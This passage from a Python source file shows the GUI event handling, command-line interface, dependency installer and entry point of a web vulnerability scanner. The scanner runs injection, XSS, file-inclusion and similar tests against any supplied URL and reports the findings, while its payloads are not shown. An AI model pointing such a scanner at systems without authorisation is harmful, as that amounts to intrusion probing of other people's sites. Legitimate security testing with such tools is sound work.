            elif event == '-STOP-':
                self.stop_scan()
                
            elif event == '-REPORT-':
                self.generate_report()
                
            elif event == '-CLEAR-':
                # Clear results
                self.window['-CONSOLE-'].update('')
                self.window['-VULN_TABLE-'].update(values=[])
                self.window['-DETAILS-'].update('')
                self.window['-TECH-'].update('')
                self.window['-TOTAL_VULN-'].update('0')
                self.window['-CRITICAL-'].update('Critical: 0')
                self.window['-HIGH-'].update('High: 0')
                self.window['-MEDIUM-'].update('Medium: 0')
                self.window['-LOW-'].update('Low: 0')
                self.window['-INFO-'].update('Info: 0')
                self.scan_results = None
                self.tech_info = None
                
            elif event == '-ALL-':
                # Select all tests
                for key in ['-SQL-', '-XSS-', '-LFI-', '-CMD-', '-AUTH-', 
                           '-CSRF-', '-IDOR-', '-HEADERS-', '-DIR-', '-HTTP-']:
                    self.window[key].update(values['-ALL-'])
                    
            elif event == '-VULN_TABLE-':
                # Show vulnerability details when clicked
                if values['-VULN_TABLE-']:
                    row = values['-VULN_TABLE-'][0]
                    self.show_vulnerability_details(row)
                    
            elif event == '-SCAN_COMPLETE-':
                # Scan completed successfully
                vulnerabilities, tech_info = values[event]
                self.scan_results = vulnerabilities
                self.tech_info = tech_info
                
                # Update UI
                self.window['-SCAN-'].update(disabled=False)
                self.window['-STOP-'].update(disabled=True)
                self.window['-REPORT-'].update(disabled=False)
                self.window['-CLEAR-'].update(disabled=False)
                
                self.log_message(f"Scan completed. Found {len(vulnerabilities)} vulnerabilities.")
                self.update_statistics()
                self.show_technology_info()
                
                # Show completion message
                sg.popup_notify("Scan Completed", 
                               f"Found {len(vulnerabilities)} vulnerabilities", 
                               display_duration_in_ms=3000)
                
            elif event == '-SCAN_ERROR-':
                # Scan failed
                error = values[event]
                self.log_message(f"Scan failed: {error}")
                self.window['-SCAN-'].update(disabled=False)
                self.window['-STOP-'].update(disabled=True)
                sg.popup_error(f"Scan failed: {error}", title="Error")
                
        self.window.close()

# ============================================
# Command Line Interface
# ============================================

def cli_interface():
    """Command line interface for the tool"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Web Application Security Testing Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s http://example.com
  %(prog)s http://example.com -t sql xss auth
  %(prog)s http://example.com -o json --quick
  %(prog)s --list-tests
        '''
    )
    
    parser.add_argument('url', nargs='?', help='Target URL to scan')
    parser.add_argument('-t', '--tests', nargs='+', 
                       choices=['sql', 'xss', 'lfi', 'cmd', 'auth', 'csrf', 'idor', 
                               'headers', 'dir', 'http', 'all'],
                       default=['all'],
                       help='Tests to run')
    parser.add_argument('-o', '--output', 
                       choices=['html', 'json', 'csv', 'all'],
                       default='html',
                       help='Output format')
    parser.add_argument('--quick', action='store_true',
                       help='Run quick scan (limited payloads)')
    parser.add_argument('--depth', type=int, default=2,
                       help='Spider depth (1-5)')
    parser.add_argument('--list-tests', action='store_true',
                       help='List available tests')
    parser.add_argument('--verbose', action='store_true',
                       help='Enable verbose output')
    parser.add_argument('--no-report', action='store_true',
                       help="Don't generate report, just show results")
    
    args = parser.parse_args()
    
    if args.list_tests:
        print(Fore.CYAN + "Available Security Tests:" + Style.RESET_ALL)
        tests = {
            'sql': 'SQL Injection testing',
            'xss': 'Cross-Site Scripting testing',
            'lfi': 'Local File Inclusion testing',
            'cmd': 'Command Injection testing',
            'auth': 'Authentication flaws testing',
            'csrf': 'CSRF vulnerability testing',
            'idor': 'Insecure Direct Object Reference testing',
            'headers': 'Security headers testing',
            'dir': 'Directory listing testing',
            'http': 'HTTP methods testing',
            'all': 'All tests'
        }
        for test, desc in tests.items():
            print(f"  {Fore.GREEN}{test:10}{Style.RESET_ALL} {desc}")
        return
    
    if not args.url:
        parser.print_help()
        return
        
    if 'all' in args.tests:
        scan_types = ['sql', 'xss', 'lfi', 'cmd', 'auth', 'csrf', 'idor', 'headers', 'dir', 'http']
    else:
        scan_types = args.tests
        
    print(Fore.CYAN + "=" * 60)
    print("Web Application Security Testing Framework")
    print("Version 2.0")
    print("=" * 60 + Style.RESET_ALL)
    
    print(f"\n{Fore.YELLOW}[*]{Style.RESET_ALL} Target: {args.url}")
    print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Tests: {', '.join(scan_types)}")
    print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Mode: {'Quick' if args.quick else 'Comprehensive'}")
    
    # Run scan
    tester = AdvancedSecurityTester(args.url)
    
    if args.quick:
        # Limit payloads for quick scan
        for key in tester.wordlists:
            tester.wordlists[key] = tester.wordlists[key][:5]
    
    vulnerabilities, tech_info = tester.run_comprehensive_scan(scan_types)
    
    # Display results
    print(f"\n{Fore.CYAN}{'='*60}")
    print("SCAN RESULTS")
    print("=" * 60 + Style.RESET_ALL)
    
    if not vulnerabilities:
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} No vulnerabilities found!")
    else:
        severity_counts = {
            "Critical": len([v for v in vulnerabilities if v.severity == "Critical"]),
            "High": len([v for v in vulnerabilities if v.severity == "High"]),
            "Medium": len([v for v in vulnerabilities if v.severity == "Medium"]),
            "Low": len([v for v in vulnerabilities if v.severity == "Low"]),
            "Info": len([v for v in vulnerabilities if v.severity == "Info"])
        }
        
        print(f"\n{Fore.YELLOW}[*]{Style.RESET_ALL} Total vulnerabilities: {len(vulnerabilities)}")
        for severity, count in severity_counts.items():
            if count > 0:
                color = {
                    "Critical": Fore.RED,
                    "High": Fore.MAGENTA,
                    "Medium": Fore.YELLOW,
                    "Low": Fore.GREEN,
                    "Info": Fore.BLUE
                }[severity]
                print(f"  {color}{severity}: {count}{Style.RESET_ALL}")
        
        # Show top vulnerabilities
        print(f"\n{Fore.YELLOW}[*]{Style.RESET_ALL} Top findings:")
        for i, vuln in enumerate(vulnerabilities[:10], 1):
            severity_color = {
                "Critical": Fore.RED,
                "High": Fore.MAGENTA,
                "Medium": Fore.YELLOW,
                "Low": Fore.GREEN,
                "Info": Fore.BLUE
            }[vuln.severity]
            
            print(f"\n  {severity_color}[{vuln.severity[0]}]{Style.RESET_ALL} {vuln.name}")
            print(f"     URL: {vuln.url}")
            print(f"     Parameter: {vuln.parameter}")
            print(f"     CVSS: {vuln.cvss_score}/10.0")
            
        if len(vulnerabilities) > 10:
            print(f"\n  ... and {len(vulnerabilities) - 10} more vulnerabilities")
    
    # Generate report if requested
    if not args.no_report and vulnerabilities:
        test_result = TestResult(
            target_url=args.url,
            start_time=datetime.now().isoformat(),
            end_time=datetime.now().isoformat(),
            vulnerabilities=vulnerabilities,
            scan_type=",".join(scan_types),
            status="Completed",
            tech_stack=tech_info
        )
        
        formats = []
        if args.output in ['html', 'all']:
            html_file = EnhancedReportGenerator.generate_html_report(test_result)
            formats.append(f"HTML: {html_file}")
            
        if args.output in ['json', 'all']:
            json_file = EnhancedReportGenerator.generate_json_report(test_result)
            formats.append(f"JSON: {json_file}")
            
        if args.output in ['csv', 'all']:
            csv_file = EnhancedReportGenerator.generate_csv_report(test_result)
            formats.append(f"CSV: {csv_file}")
            
        print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Reports generated:")
        for fmt in formats:
            print(f"  {fmt}")
    
    print(f"\n{Fore.CYAN}{'='*60}")
    print("Scan completed successfully!")
    print("=" * 60 + Style.RESET_ALL)

# ============================================
# Installation Helper
# ============================================

def check_dependencies():
    """Check and install required dependencies"""
    import importlib
    import subprocess
    import sys
    
    required = ['requests', 'beautifulsoup4', 'PySimpleGUI']
    optional = ['colorama', 'selenium', 'nmap']
    
    print(Fore.CYAN + "Checking dependencies..." + Style.RESET_ALL)
    
    missing = []
    for package in required:
        try:
            importlib.import_module(package.lower() if package == 'PySimpleGUI' else package)
            print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} {package}")
        except ImportError:
            missing.append(package)
            print(f"{Fore.RED}[✗]{Style.RESET_ALL} {package}")
    
    if missing:
        print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} Installing missing dependencies...")
        for package in missing:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} Dependencies installed")
    
    print(f"\n{Fore.CYAN}Optional dependencies:" + Style.RESET_ALL)
    for package in optional:
        try:
            importlib.import_module(package)
            print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} {package}")
        except ImportError:
            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {package} (optional)")

# ============================================
# Main Entry Point
# ============================================

def main():
    """Main entry point"""
    
    # Banner
    print(Fore.CYAN + """
    ╔══════════════════════════════════════════════════════════════╗
    ║     Web Application Security Testing Framework (WASTF)       ║
    ║                       Version 1.0                            ║
    ║             Advanced Security Testing Tool                   ║
    ║                   BY CHAITANYA KULKARNI                      ║
    ╚══════════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)
    
    # Check if running in GUI or CLI mode
    if len(sys.argv) > 1:
        # Command line mode
        cli_interface()
    elif GUI_AVAILABLE:
        # GUI mode
        try:
            app = SecurityScannerGUI()
            app.run()
        except Exception as e:
            print(f"{Fore.RED}[!]{Style.RESET_ALL} GUI Error: {e}")
            print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Falling back to CLI mode...")
            cli_interface()
    else:
        # Install dependencies and run CLI
        check_dependencies()
        cli_interface()

if __name__ == "__main__":
    main()
